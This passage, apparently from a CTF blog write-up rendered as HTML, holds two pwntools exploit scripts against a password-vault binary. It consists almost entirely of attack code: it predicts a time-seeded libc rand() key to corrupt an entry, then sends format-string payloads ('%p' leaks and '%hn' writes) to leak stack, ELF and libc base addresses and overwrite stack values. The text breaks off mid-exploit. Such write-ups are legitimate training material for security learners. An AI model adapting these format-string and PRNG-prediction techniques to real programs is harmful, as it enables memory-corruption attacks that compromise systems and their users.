#libc = ELF('./libc.so.6')
#import socks
#context.proxy = (socks.SOCKS5, '192.168.31.251', 10808)
</span><span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
#brva 0x001778
#brva 0x017C4
#brva 0x01873
brva 0x126D
#continue
</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="o">**</span><span class="nf">locals</span><span class="p">())</span>
<span class="c1">#import os
#os.systimport os
#io = remote(*attack.split(':'))
</span>
<span class="c1">#keys = []
</span><span class="k">def</span> <span class="nf">genkey</span><span class="p">():</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">64</span><span class="p">):</span>
        <span class="n">keys</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">cdl</span><span class="p">.</span><span class="nf">rand</span><span class="p">()</span><span class="o">&amp;</span><span class="mh">0xFF</span><span class="p">)</span>

<span class="n">terminators</span> <span class="o">=</span> <span class="p">[</span>
    <span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">,</span>
    <span class="sh">'</span><span class="se">\t</span><span class="sh">'</span><span class="p">,</span>  <span class="c1"># Tab       (0x09)
</span>    <span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">,</span>  <span class="c1"># Newline   (0x0A)
</span>    <span class="sh">'</span><span class="se">\v</span><span class="sh">'</span><span class="p">,</span>  <span class="c1"># Vertical Tab (0x0B)
</span>    <span class="sh">'</span><span class="se">\f</span><span class="sh">'</span><span class="p">,</span>  <span class="c1"># Form Feed (0x0C)
</span>    <span class="sh">'</span><span class="se">\r</span><span class="sh">'</span><span class="p">,</span>  <span class="c1"># Carriage Return (0x0D)
</span>    <span class="sh">'</span><span class="s"> </span><span class="sh">'</span>    <span class="c1"># Space     (0x20)
</span><span class="p">]</span>
<span class="n">ascii_values</span> <span class="o">=</span> <span class="p">[</span><span class="nf">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">terminators</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">rp</span><span class="p">(</span><span class="n">sizes</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="n">size</span> <span class="o">=</span> <span class="mh">0x100</span> <span class="o">-</span> <span class="mh">0x19</span> <span class="o">+</span> <span class="mh">0x18</span>
    <span class="n">keyc</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">idx</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
        <span class="n">i</span> <span class="o">=</span> <span class="n">keys</span><span class="p">[</span><span class="n">idx</span><span class="o">%</span><span class="nf">len</span><span class="p">(</span><span class="n">keys</span><span class="p">)]</span>
        <span class="n">tmp</span> <span class="o">=</span> <span class="n">i</span> <span class="o">^</span> <span class="mh">0x43</span>
        <span class="k">if</span> <span class="n">tmp</span> <span class="ow">in</span> <span class="n">ascii_values</span><span class="p">:</span>
            <span class="n">keyc</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="mh">0x03</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">keyc</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span>
    <span class="n">keyc</span><span class="p">[</span><span class="n">sizes</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">^</span> <span class="n">keys</span><span class="p">[(</span><span class="n">sizes</span><span class="o">-</span><span class="mi">2</span><span class="p">)</span><span class="o">%</span><span class="nf">len</span><span class="p">(</span><span class="n">keys</span><span class="p">)]</span>
    <span class="n">keyc</span><span class="p">[</span><span class="n">sizes</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">^</span> <span class="n">keys</span><span class="p">[(</span><span class="n">sizes</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">%</span><span class="nf">len</span><span class="p">(</span><span class="n">keys</span><span class="p">)]</span>
    <span class="n">keyc</span><span class="p">[</span><span class="n">sizes</span><span class="p">]</span> <span class="o">=</span> <span class="n">keys</span><span class="p">[</span><span class="n">sizes</span><span class="o">%</span><span class="nf">len</span><span class="p">(</span><span class="n">keys</span><span class="p">)]</span>
    <span class="k">return</span> <span class="nf">bytes</span><span class="p">(</span><span class="n">keyc</span><span class="p">)[:</span><span class="n">size</span><span class="p">]</span>


<span class="n">url</span> <span class="o">=</span> <span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x80</span> <span class="o">+</span> <span class="sh">'</span><span class="s">:</span><span class="sh">'</span>
<span class="k">def</span> <span class="nf">add_entry</span><span class="p">(</span><span class="n">pwd</span><span class="p">,</span> <span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">URL: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="n">pwd</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mh">0x10</span><span class="p">):</span>
    <span class="n">io</span> <span class="o">=</span> <span class="nf">start</span><span class="p">([])</span>
    <span class="n">cdl</span><span class="p">.</span><span class="nf">srand</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()))</span>
    <span class="n">keys</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="nf">genkey</span><span class="p">()</span>
    <span class="nf">add_entry</span><span class="p">(</span><span class="nf">rp</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="nf">p16</span><span class="p">(</span><span class="mh">0x8060</span><span class="p">)))</span>
    <span class="nf">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="nf">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
        <span class="nf">ru</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">3. Exit</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">().</span><span class="nf">decode</span><span class="p">()</span>
        <span class="k">if</span> <span class="n">data</span> <span class="o">!=</span> <span class="n">url</span><span class="p">:</span>
            <span class="n">io</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
            <span class="k">continue</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="n">io</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
        <span class="k">continue</span>
    <span class="n">gdb</span><span class="p">.</span><span class="nf">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span><span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>

    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">URL: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">%p%p%p</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">123</span><span class="sh">'</span><span class="p">)</span>

    <span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>

</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

<ul>
  <li>exploit</li>
</ul>

<p>‍</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="n">ctypes</span> <span class="kn">import</span> <span class="n">CDLL</span>
<span class="n">cdl</span> <span class="o">=</span> <span class="nc">CDLL</span><span class="p">(</span><span class="sh">'</span><span class="s">./glibc/libc.so.6</span><span class="sh">'</span><span class="p">)</span>
<span class="n">s</span>    <span class="o">=</span> <span class="k">lambda</span>   <span class="n">x</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">sa</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">)</span>
<span class="n">sl</span>   <span class="o">=</span> <span class="k">lambda</span>   <span class="n">x</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">sla</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">)</span>
<span class="n">r</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">ru</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">rl</span>   <span class="o">=</span> <span class="k">lambda</span>     <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
<span class="n">itr</span>  <span class="o">=</span> <span class="k">lambda</span>     <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
<span class="n">uu32</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="nf">u32</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="nf">u64</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">ls</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">lss</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="nf">ls</span><span class="p">(</span><span class="sh">'</span><span class="se">\033</span><span class="s">[1;31;40m%s -&gt; 0x%x </span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="nf">eval</span><span class="p">(</span><span class="n">x</span><span class="p">)))</span>

<span class="n">attack</span> <span class="o">=</span> <span class="sh">''</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">)</span>
<span class="n">binary</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./vault</span><span class="sh">'</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span><span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span><span class="n">gdbscript</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">TAG</span><span class="p">:</span><span class="k">return</span> <span class="nf">remote</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">.</span><span class="n">TAG</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">))</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REM</span><span class="p">:</span><span class="k">return</span> <span class="nf">remote</span><span class="p">(</span><span class="o">*</span><span class="n">attack</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">))</span>
    <span class="k">return</span> <span class="nf">process</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="c1">#context(log_level = 'debug')
</span><span class="nf">context</span><span class="p">(</span><span class="n">binary</span> <span class="o">=</span> <span class="n">binary</span><span class="p">,</span> <span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span><span class="p">,</span>
<span class="n">terminal</span><span class="o">=</span><span class="sh">'</span><span class="s">tmux splitw -h -l 170</span><span class="sh">'</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">))</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span><span class="p">.</span><span class="n">libc</span>
<span class="c1">#elf  = ELF(binary)
#print(context.binary.libs)
#libc = ELF('./libc.so.6')
#import socks
#context.proxy = (socks.SOCKS5, '192.168.31.251', 10808)
</span><span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
#brva 0x001778
#brva 0x017C4
#brva 0x01873
brva 0x126D
#continue
</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="o">**</span><span class="nf">locals</span><span class="p">())</span>
<span class="c1">#import os
#os.systimport os
#io = remote(*attack.split(':'))
</span>
<span class="c1">#keys = []
</span><span class="k">def</span> <span class="nf">genkey</span><span class="p">():</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">64</span><span class="p">):</span>
        <span class="n">keys</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">cdl</span><span class="p">.</span><span class="nf">rand</span><span class="p">()</span><span class="o">&amp;</span><span class="mh">0xFF</span><span class="p">)</span>

<span class="n">terminators</span> <span class="o">=</span> <span class="p">[</span>
    <span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">,</span>
    <span class="sh">'</span><span class="se">\t</span><span class="sh">'</span><span class="p">,</span>  <span class="c1"># Tab       (0x09)
</span>    <span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">,</span>  <span class="c1"># Newline   (0x0A)
</span>    <span class="sh">'</span><span class="se">\v</span><span class="sh">'</span><span class="p">,</span>  <span class="c1"># Vertical Tab (0x0B)
</span>    <span class="sh">'</span><span class="se">\f</span><span class="sh">'</span><span class="p">,</span>  <span class="c1"># Form Feed (0x0C)
</span>    <span class="sh">'</span><span class="se">\r</span><span class="sh">'</span><span class="p">,</span>  <span class="c1"># Carriage Return (0x0D)
</span>    <span class="sh">'</span><span class="s"> </span><span class="sh">'</span>    <span class="c1"># Space     (0x20)
</span><span class="p">]</span>
<span class="n">ascii_values</span> <span class="o">=</span> <span class="p">[</span><span class="nf">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">terminators</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">rp</span><span class="p">(</span><span class="n">sizes</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="n">size</span> <span class="o">=</span> <span class="mh">0x100</span> <span class="o">-</span> <span class="mh">0x19</span> <span class="o">+</span> <span class="mh">0x18</span>
    <span class="n">keyc</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">idx</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
        <span class="n">i</span> <span class="o">=</span> <span class="n">keys</span><span class="p">[</span><span class="n">idx</span><span class="o">%</span><span class="nf">len</span><span class="p">(</span><span class="n">keys</span><span class="p">)]</span>
        <span class="n">tmp</span> <span class="o">=</span> <span class="n">i</span> <span class="o">^</span> <span class="mh">0x43</span>
        <span class="k">if</span> <span class="n">tmp</span> <span class="ow">in</span> <span class="n">ascii_values</span><span class="p">:</span>
            <span class="n">keyc</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="mh">0x03</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">keyc</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span>
    <span class="n">keyc</span><span class="p">[</span><span class="n">sizes</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">^</span> <span class="n">keys</span><span class="p">[(</span><span class="n">sizes</span><span class="o">-</span><span class="mi">2</span><span class="p">)</span><span class="o">%</span><span class="nf">len</span><span class="p">(</span><span class="n">keys</span><span class="p">)]</span>
    <span class="n">keyc</span><span class="p">[</span><span class="n">sizes</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">^</span> <span class="n">keys</span><span class="p">[(</span><span class="n">sizes</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">%</span><span class="nf">len</span><span class="p">(</span><span class="n">keys</span><span class="p">)]</span>
    <span class="n">keyc</span><span class="p">[</span><span class="n">sizes</span><span class="p">]</span> <span class="o">=</span> <span class="n">keys</span><span class="p">[</span><span class="n">sizes</span><span class="o">%</span><span class="nf">len</span><span class="p">(</span><span class="n">keys</span><span class="p">)]</span>
    <span class="k">return</span> <span class="nf">bytes</span><span class="p">(</span><span class="n">keyc</span><span class="p">)[:</span><span class="n">size</span><span class="p">]</span>


<span class="n">url</span> <span class="o">=</span> <span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x80</span> <span class="o">+</span> <span class="sh">'</span><span class="s">:</span><span class="sh">'</span>
<span class="k">def</span> <span class="nf">add_entry</span><span class="p">(</span><span class="n">pwd</span><span class="o">=</span><span class="sh">'</span><span class="s">pwd</span><span class="sh">'</span><span class="p">,</span> <span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">):</span>
    <span class="c1">#ru('3. Exit\n')
</span>    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">URL: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="n">pwd</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mh">0x10</span><span class="p">):</span>
    <span class="n">io</span> <span class="o">=</span> <span class="nf">start</span><span class="p">([])</span>
    <span class="n">cdl</span><span class="p">.</span><span class="nf">srand</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()))</span>
    <span class="n">keys</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="nf">genkey</span><span class="p">()</span>
    <span class="nf">add_entry</span><span class="p">(</span><span class="nf">rp</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="nf">p16</span><span class="p">(</span><span class="mh">0x8060</span><span class="p">)))</span>
    <span class="nf">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="nf">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
        <span class="nf">ru</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">3. Exit</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">().</span><span class="nf">decode</span><span class="p">()</span>
        <span class="k">if</span> <span class="n">data</span> <span class="o">!=</span> <span class="n">url</span><span class="p">:</span>
            <span class="n">io</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
            <span class="k">continue</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="n">io</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
        <span class="k">continue</span>
    

    <span class="n">pay</span>  <span class="o">=</span> <span class="sa">f</span><span class="sh">'</span><span class="s">-=%</span><span class="si">{</span><span class="mi">6</span><span class="o">+</span><span class="mh">0x3</span><span class="si">}</span><span class="s">$p-</span><span class="sh">'</span>
    <span class="n">pay</span> <span class="o">+=</span> <span class="sa">f</span><span class="sh">'</span><span class="s">%</span><span class="si">{</span><span class="mi">6</span><span class="o">+</span><span class="mh">0x4</span><span class="si">}</span><span class="s">$p-</span><span class="sh">'</span>
    <span class="n">pay</span> <span class="o">+=</span> <span class="sa">f</span><span class="sh">'</span><span class="s">%</span><span class="si">{</span><span class="mi">6</span><span class="o">+</span><span class="mh">0x1b</span><span class="si">}</span><span class="s">$p-</span><span class="sh">'</span>
    <span class="nf">add_entry</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">pay</span><span class="p">)</span>
    
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">-=</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">stack</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">-</span><span class="sh">'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span>
    <span class="n">elf_base</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">-</span><span class="sh">'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mi">4608</span>
    <span class="n">libc_base</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">-</span><span class="sh">'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mi">171584</span>

    <span class="n">addr1</span> <span class="o">=</span> <span class="n">stack</span> <span class="o">-</span> <span class="mh">0x38</span>
    <span class="n">pay</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'</span><span class="s">%</span><span class="si">{</span><span class="n">addr1</span> <span class="o">&amp;</span><span class="mh">0xFFFF</span><span class="si">}</span><span class="s">c%</span><span class="si">{</span><span class="mi">6</span><span class="o">+</span><span class="mh">0xb</span><span class="si">}</span><span class="s">$hn</span><span class="sh">'</span>
    <span class="nf">add_entry</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">pay</span><span class="p">)</span>


    <span class="c1"># 0x22:0110│  0x7ffc2c391c20 —▸ 0x7ffc2c391be0 ◂— 0
</span>    <span class="c1"># 0x29:0148│  0x7fffdb060668 —▸ 0x7fffdb060630 —▸ 0x7fffdb060660 ◂— 1
</span>
    <span class="c1">#addr2 = stack - 0x78
</span>    <span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">stack</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">elf_base</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">libc_base</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">addr2</span> <span class="o">=</span> <span class="n">stack</span> <span class="o">-</span> <span class="mh">0x118</span>
    <span class="c1">#pay = f'%{addr2 &amp; 0xFFFF}c%{6+0x29}$hn'
</span>    <span class="c1">#add_entry(url=pay)
</span>    <span class="n">pay</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">elf_base</span> <span class="o">+</span> <span class="mh">0x05100</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">2</span><span class="p">):</span>
        <span class="n">t1</span> <span class="o">=</span> <span class="n">addr2</span> <span class="o">+</span> <span class="n">i</span>
        <span class="n">t2</span> <span class="o">=</span> <span class="nf">u16</span><span class="p">(</span><span class="n">pay</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">])</span>
        <span class="n">pay1</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'</span><span class="s">%</span><span class="si">{</span><span class="n">t1</span> <span class="o">&amp;</span> <span class="mh">0xFFFF</span><span class="si">}</span><span class="s">c%</span><span class="si">{</span><span class="mi">6</span><span class="o">+</span><span class="mh">0x29</span><span class="si">}</span><span class="s">$hn</span><span class="sh">'</span>
        <span class="n">pay2</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'</span><span class="s">%</span><span class="si">{</span><span class="n">t2</span> <span class="o">&amp;</span> <span class="mh">0xFFFF</span><span class="si">}</span><span class="s">c%</span><span class="si">{</span><span class="mi">6</span><span class="o">+</span><span class="mh">0x22</span><span class="si">}</span><span class="s">$hn</span><span class="sh">'</span>
        <span class="nf">add_entry</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">pay1</span><span class="p">)</span>
        <span class="nf">add_entry</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">pay2</span><span class="p">)</span>
        <span class="c1">#pause()
</span>    <span class="c1"># 1a:00d0│  0x7ffee6333750 —▸ 0x5f2e78fe9100
